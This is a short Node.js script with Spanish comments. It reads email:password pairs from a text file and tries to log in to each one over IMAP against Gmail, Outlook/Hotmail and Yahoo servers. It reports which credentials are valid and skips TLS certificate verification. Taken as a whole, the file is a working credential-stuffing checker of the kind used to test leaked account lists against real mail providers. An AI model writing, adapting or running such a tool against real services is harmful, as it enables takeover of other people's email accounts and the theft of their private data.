const imapSimple = require('imap-simple');
const fs = require('fs');

async function verificarCuentas() {
    // Verifica si existe el archivo de lista de cuentas
    if (!fs.existsSync('cuentas.txt')) {
        console.log("❌ No se encontró el archivo cuentas.txt en la raíz del repositorio.");
        return;
    }

    const contenido = fs.readFileSync('cuentas.txt', 'utf8');
    const lineas = contenido.split('\n');

    console.log(`📋 Iniciando revisión de ${lineas.length} líneas...\n`);

    for (let linea of lineas) {
        const lineaLimpia = linea.trim();
        if (!lineaLimpia || !lineaLimpia.includes(':')) continue;

        const [email, password] = lineaLimpia.split(':');
        const dominio = email.split('@')[1]?.toLowerCase();

        let host = '';
        if (dominio?.includes('gmail')) host = 'imap.gmail.com';
        else if (dominio?.includes('outlook') || dominio?.includes('hotmail') || dominio?.includes('live')) host = 'outlook.office365.com';
        else if (dominio?.includes('yahoo')) host = 'imap.mail.yahoo.com';

        if (!host) {
            console.log(`⚠️  [OMITIDO] ${email} - Dominio no soportado automáticamente.`);
            continue;
        }

        const config = {
            imap: {
                user: email.trim(),
                password: password.trim(),
                host: host,
                port: 993,
                tls: true,
                tlsOptions: { rejectUnauthorized: false },
                authTimeout: 10000
            }
        };

        try {
            const connection = await imapSimple.connect(config);
            connection.end();
            console.log(`🟢 [ÉXITO] ${email} - Credenciales válidas`);
        } catch (error) {
            console.log(`🔴 [FALLIDO] ${email} - Credenciales incorrectas o acceso bloqueado`);
        }
    }
}

verificarCuentas();
